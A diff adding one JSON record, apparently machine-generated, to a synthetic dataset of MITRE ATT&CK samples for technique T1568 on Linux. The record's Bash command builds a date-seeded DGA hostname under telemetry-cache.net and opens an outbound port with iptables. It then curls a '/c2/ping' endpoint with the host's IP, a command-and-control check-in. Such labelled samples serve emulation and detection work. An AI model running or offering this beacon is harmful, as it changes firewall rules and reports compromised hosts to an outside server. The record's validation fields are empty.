@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "FQDN=$(python3 - <<'EOF'\nimport hashlib, time\ns=\"beta\"+time.strftime(\"%Y%m%d\")\nprint(hashlib.sha1(s.encode()).hexdigest()[:10]+\".telemetry-cache.net\")\nEOF\n); PORT=$(shuf -e 8443 2052 2087 -n1); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; IP=$(getent hosts \"$FQDN\" | awk '{print $1}' | shuf -n1); [ -n \"$IP\" ] && curl --fail --silent --show-error --resolve \"${FQDN}:${PORT}:${IP}\" \"https://${FQDN}:${PORT}/c2/ping?i=$(hostname -I | awk '{print $1}')\"",
+  "explanation": "Uses a Python one-liner DGA to derive a hostname, resolves it via system NSS, and pins the curl connection to the returned IP with --resolve on a nonstandard port.",
+  "rationale_steps": [
+    "Generate DGA hostname using date-based seed",
+    "Open egress for chosen uncommon TLS port",
+    "Resolve hostname dynamically via getent",
+    "Establish C2 check-in bound to resolved IP"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-3cc49009",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
